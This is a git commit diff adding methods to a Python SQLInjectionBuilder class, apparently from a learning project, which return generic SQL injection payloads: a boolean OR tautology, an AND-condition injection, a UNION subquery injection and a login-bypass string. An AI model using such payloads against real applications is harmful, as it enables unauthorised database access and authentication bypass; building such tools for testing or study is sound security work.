4ad1f7aaf655d707301a8512b0ec8a546da1f5f7
Jose Manuel Sanchez Rico <josesanc@c2r8s2.42malaga.com>
2023-06-06 20:30:27 +0200

    SQL injection builder first methods

--- src/slq_injection_builder.py
+++ src/slq_injection_builder.py
@@ -2,6 +2,21 @@ class SQLInjectionBuilder:
     def __init__(self, engine) -> None:
         self.engine = engine
 
+    def or_boolean_injection() -> None:
+        """
+        Useful for database condition checks
+        """
+        return f"\' OR 1='1; -- "
+
+    def and_boolean_injection(condition: str) -> None:
+        """
+        Useful for database checks and using another query
+        """
+        return f"\' AND {condition}; -- "
+
+    def union_injection(subquery: str) -> None:
+        return f"UNION {subquery} -- "
+
     def login_user(usr_id: int) -> None:
         return f"\' or {usr_id}=\"{usr_id}\";-- "
 
